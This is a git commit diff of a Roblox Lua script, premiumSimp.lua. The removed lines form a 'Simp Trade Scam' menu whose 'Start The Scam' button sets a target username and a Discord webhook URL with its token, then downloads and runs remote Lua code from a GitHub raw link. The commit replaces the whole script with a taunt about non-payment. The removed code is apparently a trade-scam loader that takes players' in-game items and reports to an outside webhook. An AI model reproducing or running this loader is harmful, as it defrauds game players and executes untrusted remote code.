77e9c641ad7a68155ed43178b6befc5afc018c76
CorruptedClan <105439556+CorruptedClan@users.noreply.github.com>
2023-04-20 19:08:42 +0300

    Update premiumSimp.lua

--- premiumSimp.lua
+++ premiumSimp.lua
@@ -1,16 +1,1 @@
-local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
-
-local Window = Library.CreateLib("Simp Trade Scam (⭐Premium)", "DarkTheme")
-
--- Main
-
-local TradeTab = Window:NewTab("Trade Scam")
-
-local ScamSection = TradeTab:NewSection("Scam thingy")
-
-ScamSection:NewButton("Start The Scam", "press before trade", function()
-    UserName = "Wizard_CatWhite"
-WebHook = "https://discord.com/api/webhooks/1090853107816214548/Vxcs9dIe4jRfqeVbX6iHJn7ZifN4_kCPfJnI17LIINOqPfBtjzXjdG0I7B93mDORO5jS"
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/HardGameSs/PSX/main/New.lua", true))()
-end)
+u didnt payed kid
